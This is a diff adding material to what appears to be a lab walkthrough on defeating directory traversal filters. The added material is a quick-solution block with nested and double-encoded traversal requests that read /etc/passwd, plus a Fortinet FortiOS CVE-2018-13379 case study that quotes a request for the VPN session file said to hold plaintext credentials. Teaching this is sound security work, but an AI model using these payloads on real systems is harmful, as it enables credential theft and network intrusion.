@@ -1,5 +1,21 @@
 # Directory Traversal: Bypassing Defensive Filters (Nested, Encoding, & Prefix)
 
+> [!TIP]
+> ### ⚡ Quick Solution (Direct Execution)
+> 1. Intercept the image request in Burp Repeater: `GET /image?filename=...`
+> 2. Apply one of the following traversal filter evasion techniques:
+>    - **Nested Traversal Sequences (Non-Recursive Strip):**
+>      ```http
+>      GET /image?filename=....//....//....//etc/passwd HTTP/1.1
+>      ```
+>    - **Double URL Encoding:**
+>      ```http
+>      GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1
+>      ```
+> 3. Click **Send** $\rightarrow$ the filter is bypassed and `/etc/passwd` is displayed.
+
+---
+
 When developers recognize the danger of _Directory Traversal_ vulnerabilities, their initial instinct is often to implement **custom sanitization filters** to strip or block dangerous strings such as `../`.
 
 However, if these filters are implemented naively—such as through non-recursive single-pass replacement, neglecting multi-layer URL decoding, or relying on simple prefix checks—attackers can bypass the protection and read sensitive system files.
@@ -174,6 +190,18 @@ Follow this methodology when testing Directory Traversal filters in **Burp Suite
 3. The system file `/etc/passwd` is returned and the challenge is marked **Solved**! 🎉
 
 ---
+
+## 🌍 Real-World Case Study & Security Incidents
+
+### Fortinet FortiOS SSL-VPN Nested Path Traversal (CVE-2018-13379)
+A high-impact path traversal flaw weaponized by global ransomware syndicates:
+* **The Flawed Sanitizer:** Fortinet FortiOS SSL-VPN filtered language portal parameters by stripping `../` sequences non-recursively.
+* **Bypass via Nested Sequences:** Attackers submitted nested traversal sequences in the URL:
+  ```text
+  GET /remote/fgt_lang?lang=....//....//....//....//....//....//....//dev/cmdb/sslvpn_websession HTTP/1.1
+  ```
+  When the sanitizer removed `../`, the surrounding characters collapsed to reform valid traversal sequences, reaching the underlying filesystem.
+* **Global Impact:** The `sslvpn_websession` file contained active VPN session usernames and plaintext credentials. International ransomware cartels (including REvil and Conti) leveraged this flaw to breach hundreds of enterprise networks and government bodies.
 
 ## 5. Backend Source Code: Vulnerable vs. Secure
 
